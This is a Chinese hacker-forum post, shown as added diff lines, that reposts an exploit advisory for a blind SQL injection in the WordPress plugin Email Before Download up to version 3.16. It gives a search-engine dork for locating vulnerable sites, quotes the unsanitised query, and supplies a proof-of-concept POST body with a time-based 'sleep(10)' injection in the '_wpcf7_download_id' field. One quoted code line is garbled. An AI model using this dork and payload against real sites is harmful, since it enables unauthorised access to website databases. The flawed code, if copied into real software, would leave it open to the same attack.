@@ -1,0 +1,48 @@
+其他软件] WordPress 0day~3.3.1
+本帖最后由 silence 于 2012-4-23 12:09 编辑 
+
+不是秒杀？是注入。。。
+-------------------------------------------------------------淫荡的分割线------------------------------------------------------------------
+WordPress Plugin Email Before Download <=3.16 Blind SQL Inyection
+— by pickup artist on 2012 年 4 月 23 日 
+
+# this page reproduce by me. thanks the author。
+# WordPress Plugin: Email Before Download <=3.16 Remote Blind SQL Inyection
+
+# Dork: allinurl: plugins/email-before-download
+# Download: https://wordpress.org/extend/plugins/email-before-download/
+# Date: we don’t know
+# Contact: we don’t know
+# Follow: @mattdch
+# (This is hacker blog ?)www.yuyi.me
+
+The variable $download_id is not properly sanitized with $wpdb->escape() before using it.
+
+On line 120 (File: /email-before-download/email-before-download.php) we can see that:
+=====================================================================================
+
+120: $ebd_item = $wpdb->get_row( “SELECT * FROM $table_item WHERE download_id = ‘$download_id’ ” );
+
+In the HTML generated, we can see that $download_id takes the $_POST value variable “_wpcf7_download_id” :
+
+201: $hf .= ‘
+
+’;
+
+PoC:
+====
+
+POST http://website.com/?tag=some-post-with-contact-form
+
+Data:
+=====
+_wpcf7=135&_wpcf7_download_id=6 [SQL HERE]&_wpcf7_unit_tag=wpcf7-f105-p1635-o1&_wpcf7_version=3.0.1&your-email=email@sample.com&your-enterprise=1&your-name=test
+
+Example:
+========
+_wpcf7=135&_wpcf7_download_id=6 and sleep(10)&_wpcf7_unit_tag=wpcf7-f105-p1635-o1&_wpcf7_version=3.0.1&your-email=email@sample.com&your-enterprise=1&your-name=test
+
+(POST variables names may vary) 
+
+2 
+评分人数
